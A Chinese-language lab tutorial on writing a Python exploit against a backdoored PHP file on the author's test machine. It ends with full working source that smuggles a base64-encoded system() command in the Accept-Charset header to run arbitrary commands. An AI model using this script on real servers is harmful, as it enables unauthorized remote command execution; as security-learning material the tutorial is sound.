# 使用Python编写一个简单的EXP
- 首先我们需要import导入两个包**request**和**base64**，他们分别用来处理请求和base64的加解码
![image](https://github.com/hecker-zz/hecker/assets/153266742/1f0f145e-839f-4327-b4ac-4808897bd9b9)

- 拿到我们后门文件的url，以我靶机为例：
![image](https://github.com/hecker-zz/hecker/assets/153266742/7cde6c29-42d6-4c52-a11c-32347af54bb8)

- 准备需要在目标机执行的cmd命令，因为请求中的命令是被base64编码的，所以我们也需要把我们的命令转成base64，转码就需要用到**base64.b64encode()** ，这里的参数需要的是**二进制**。
![image](https://github.com/hecker-zz/hecker/assets/153266742/579093b8-9698-4d21-9e82-0a2c0cda4371)


- 创建一个请求的头部
![image](https://github.com/hecker-zz/hecker/assets/153266742/1881085a-96f4-4098-9bb4-75b3ec1acefd)

- 发送GET请求并把**url**和**headers**使用关键字传参填入，把得到的回应做一个筛选，让其只显示执行命令的结果，不显示HTML页面，最后打印到屏幕上即可。
![image](https://github.com/hecker-zz/hecker/assets/153266742/e699c70c-cd04-4bb7-9600-9b4262ff80e4)



- 一切准备就绪，看看结果吧！
![image](https://github.com/hecker-zz/hecker/assets/153266742/97f0ebb3-ef84-433b-94c8-ab1d1f602fc3)

- 只需要更改cmd变量即可执行不同的命令
![image](https://github.com/hecker-zz/hecker/assets/153266742/3a69a700-866b-4a08-8f80-72f507ba8e88)



- 源码如下：
```python
import requests
import base64

#后门文件的url
url="http://192.168.200.148/1.php"

#创建cmd命令，并加密成base64
cmd="whoami"
cmd=f"""system("{cmd}");"""
cmd=base64.b64encode(cmd.encode()).decode()


#创建请求头部
headers={
    "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Accept-Encoding":  "gzip,deflate",
    "Accept-Charset":   f"{cmd}"
}


#创建请求
res=requests.get(  url=url,  headers = headers)
html=res.content.decode("GBK")
html=html[0:html.find("<!DOCTYPE")]
print(html)
```